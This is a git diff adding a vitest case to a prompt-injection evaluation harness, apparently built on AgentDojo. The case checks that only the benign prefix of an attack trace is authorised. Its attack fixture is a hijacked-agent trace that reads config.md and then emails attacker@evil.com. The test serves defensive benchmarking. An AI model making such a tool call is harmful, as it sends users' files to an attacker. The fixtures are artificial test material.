@@ -1,5 +1,6 @@
 import { describe, expect, it } from 'vitest';
-import { parseToolPlan } from '../scripts/agentdojo-real/model-in-loop';
+import { declaredTrajectoryCalls, parseToolPlan } from '../scripts/agentdojo-real/model-in-loop';
+import type { Task } from '../scripts/agentdojo-real/suite';
 
 describe('model-in-the-loop evaluation plan parser', () => {
   it('accepts plain and fenced JSON tool plans', () => {
@@ -12,6 +13,22 @@ describe('model-in-the-loop evaluation plan parser', () => {
     expect(parseToolPlan('{"calls":[{"name":"list_files","arguments":{}}]}')).toEqual([
       { name: 'list_files', arguments: {} },
     ]);
+  });
+
+  it('authorizes the full trace for benign controls but only the benign prefix for attacks', () => {
+    const control = {
+      attackExpected: false,
+      susceptibleTrace: [{ name: 'send_email', arguments: { to: 'boss@company.com' } }],
+    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
+    const attack = {
+      attackExpected: true,
+      susceptibleTrace: [
+        { name: 'read_file', arguments: { path: 'config.md' } },
+        { name: 'send_email', arguments: { to: 'attacker@evil.com' } },
+      ],
+    } as Pick<Task, 'attackExpected' | 'susceptibleTrace'>;
+    expect(declaredTrajectoryCalls(control)).toEqual(control.susceptibleTrace);
+    expect(declaredTrajectoryCalls(attack)).toEqual([attack.susceptibleTrace[0]]);
   });
 
   it('rejects prose, malformed calls, and oversized plans', () => {
